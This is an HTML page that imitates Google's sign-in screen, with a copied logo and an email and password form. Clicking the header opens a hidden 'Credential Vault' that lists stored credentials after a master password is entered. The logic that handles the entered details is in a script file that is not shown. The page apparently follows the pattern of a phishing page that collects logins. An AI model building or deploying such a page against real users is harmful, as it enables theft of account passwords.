
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Style Login with Credential Locker</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="google-header" onclick="showLockerModal()">
        <svg class="google-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M12 0C5.4 0 0 5.4 0 12s5.4 12 12 12 12-5.4 12-12S18.6 0 12 0zm-1.7 16.3c-2.1 0-3.8-1.7-3.8-3.8s1.7-3.8 3.8-3.8c1 0 1.9.4 2.5 1l-1.1 1.1c-.3-.3-.8-.5-1.4-.5-1.2 0-2.2 1-2.2 2.2s1 2.2 2.2 2.2c1.4 0 1.9-.6 2.1-1.1h-2.1v-1.5h3.4c.1.4.1.8.1 1.2 0 2.1-1.4 3.6-3.6 3.6zm7.5-2.9h-1.5v1.5h-1.5v-1.5h-1.5v-1.5h1.5v-1.5h1.5v1.5h1.5v1.5z" fill="#4285F4"/>
        </svg>
        <span class="google-logo">Google</span>
    </div>

    <div class="container">
        <h1>Sign in</h1>
        <form id="loginForm">
            <div class="form-group">
                <label for="email">Email or phone</label>
                <input type="email" id="email" required>
                <div class="error-message" id="emailError">Please enter a valid email address</div>
            </div>

            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" required minlength="6">
                <div class="error-message" id="passwordError">Password must be at least 6 characters</div>
            </div>

            <button type="submit" class="submit-btn">Next</button>
        </form>
    </div>

    <div class="locker-modal" id="lockerModal">
        <h2 style="color: #202124; margin-bottom: 1rem;">Credential Vault</h2>
        <input type="password" id="masterPassword" 
            class="master-password-input" 
            placeholder="Enter your Password">
        <button class="unlock-btn" onclick="showCredentials()">Unlock</button>
        <div class="credential-list" id="credentialList"></div>
    </div>

    <script src="script.js"></script>
</body>
</html>
